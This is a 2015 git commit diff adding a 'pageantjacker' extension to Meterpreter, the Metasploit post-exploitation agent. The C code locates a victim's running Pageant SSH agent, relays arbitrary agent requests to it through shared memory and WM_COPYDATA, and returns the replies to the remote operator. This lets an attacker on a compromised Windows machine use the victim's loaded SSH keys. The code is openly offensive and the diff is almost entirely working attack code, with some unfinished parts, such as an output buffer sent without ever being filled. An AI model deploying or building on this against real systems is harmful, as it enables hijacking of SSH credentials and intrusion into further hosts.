d3d91dd85cb5a933c8dddf667baffbafdb371b55
Stuart Morgan <stuart.morgan@mwrinfosecurity.com>
2015-05-13 22:28:09 +0100

    Fixing all the 2015rc stuff so that it compiles under 2013

--- source/extensions/pageantjacker/pageantjacker.c
+++ source/extensions/pageantjacker/pageantjacker.c
@@ -3,6 +3,7 @@
  * @brief Entry point and intialisation functionality for the pageantjacker extention.
  */
 #include "../../common/common.h"
+#include "pageantjacker.h"
 
 #include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
 // include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
@@ -15,9 +16,31 @@ EnableDelayLoadMetSrv();
 
 Command customCommands[] =
 {
-	// custom commands go here
+	COMMAND_REQ("pageant_send_query", request_pageant_send_query),
 	COMMAND_TERMINATOR
 };
+
+DWORD request_pageant_send_query(Remote *remote, Packet *packet)
+{
+	Packet *response = packet_create_response(packet);
+	Byte *raw_data_in, *raw_data_out;
+	DWORD raw_data_size_in, raw_data_size_out;
+	PAGEANTQUERYRESULTS results;
+
+	raw_data_size_out = 8192;
+	/* dprintf */
+	raw_data_size_in = packet_get_tlv_value_uint(packet, TLV_META_TYPE_UINT);
+	raw_data_in = packet_get_tlv_value_raw(packet, TLV_META_TYPE_RAW);
+
+	//raw_data_out = send_query_to_pageant(raw_data_in, raw_data_size_in);
+	results = send_query_to_pageant(raw_data_in, raw_data_size_in);
+
+	packet_add_tlv_raw(response, TLV_META_TYPE_RAW, raw_data_out, raw_data_size_out);
+	packet_transmit_response(ERROR_SUCCESS, remote, response);
+
+	return ERROR_SUCCESS;
+}
+
 
 /*!
  * @brief Initialize the server extension
@@ -39,5 +62,62 @@ DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
 	command_deregister_all(customCommands);
 
 	return ERROR_SUCCESS;
+}
+
+PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength) {
+	
+	char strPuttyRequest[23];
+	COPYDATASTRUCT pageant_copy_data;
+	unsigned char *filemap_pointer;
+	HANDLE filemap;
+	PAGEANTQUERYRESULTS ret;
+	HWND hPageant;
+
+	// Initialise the result array
+	memset(&ret, 0, sizeof(ret));
+	ret.result = FALSE;
+
+	hPageant = FindWindowW(PAGEANT_NAME, PAGEANT_NAME);
+
+	// Generate the request string and populate the struct
+	snprintf(&strPuttyRequest, sizeof(strPuttyRequest), "PageantRequest%08x\x00", (unsigned int) GetCurrentThreadId()); // This will always be 23 chars
+	pageant_copy_data.dwData = AGENT_COPYDATA_ID;
+	pageant_copy_data.cbData = sizeof(strPuttyRequest);
+	pageant_copy_data.lpData = &strPuttyRequest;
+
+	// Pageant effectively communicates with PuTTY using shared memory (in this case, a pagefile backed memory allocation).
+	// It will overwrite this memory block with the result of the query.
+	filemap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, AGENT_MAX, (char *) &strPuttyRequest);
+	if (filemap && filemap != INVALID_HANDLE_VALUE) {
+		if (filemap_pointer = MapViewOfFile(filemap, FILE_MAP_WRITE, 0, 0, 0)) {
+
+			// Copy the request to the memory block that will be passed to Pageant.
+			memcpy(filemap_pointer, query, querylength);
+
+			// Send the request message to Pageant.
+			if (SendMessage(hPageant, WM_COPYDATA, (WPARAM) NULL, (LPARAM) &pageant_copy_data)) {
+				if (ret.blob = malloc(AGENT_MAX)) {
+					memcpy(ret.blob, filemap_pointer, AGENT_MAX);
+					ret.result = TRUE;
+				} else {
+					ret.error_message = PAGEANTJACKER_ERROR_ALLOC;
+				}
+				
+			} else {
+				// SendMessage failed
+				ret.error_message = PAGEANTJACKER_ERROR_SENDMESSAGE;
+			}
+			UnmapViewOfFile(filemap_pointer);
+		} else {
+			// MapViewOfFile failed
+			ret.error_message = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
+		}
+		CloseHandle(filemap);
+	} else {
+		// CreateFileMapping failed
+		ret.error_message = PAGEANTJACKER_ERROR_CREATEFILEMAPPING;
+	}
+
+	return ret;
 }
 
--- source/extensions/pageantjacker/pageantjacker.h
+++ source/extensions/pageantjacker/pageantjacker.h
@@ -2,11 +2,38 @@
  * @file pageantjacker.h
  * @brief Entry point and intialisation declrations for the pageantjacker extention.
  */
-#ifndef _METERPRETER_SOURCE_EXTENSION_BARE_BARE_H
-#define _METERPRETER_SOURCE_EXTENSION_BARE_BARE_H
+#ifndef _METERPRETER_SOURCE_EXTENSION_PAGEANTJACKER_PAGEANTJACKER_H
+#define _METERPRETER_SOURCE_EXTENSION_PAGEANTJACKER_PAGEANTJACKER_H
 
-#define TLV_TYPE_EXTENSION_BARE	0
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
 
-// Custom TLVs go here
+// TLVs
+#define TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS		  1
+#define TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE 1<<1
+#define TLV_TYPE_EXTENSION_PAGEANTJACKER_RETURNEDBLOB 1<<2
+
+// Results from the pageant query function
+typedef struct __PAGEANTQUERYRESULTS {
+	byte result;
+	unsigned char *error_message;
+	byte *blob;
+} PAGEANTQUERYRESULTS;
+
+// Class and window name
+#define PAGEANT_NAME L"Pageant"
+
+#define PAGEANTJACKER_ERROR_SENDMESSAGE "The Pageant request was not processed."
+#define PAGEANTJACKER_ERROR_MAPVIEWOFFILE "Unable to obtain IPC memory address."
+#define PAGEANTJACKER_ERROR_CREATEFILEMAPPING "Unable to allocate memory for Pageant<-->Meterpreter IPC."
+#define PAGEANTJACKER_ERROR_ALLOC "Unable to allocate memory buffer."
+
+#define AGENT_MAX 8192
+#define AGENT_COPYDATA_ID 0x804e50ba 
+
+// Function definitions
+PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength);
+DWORD request_pageant_send_query(Remote *remote, Packet *packet);
 
 #endif
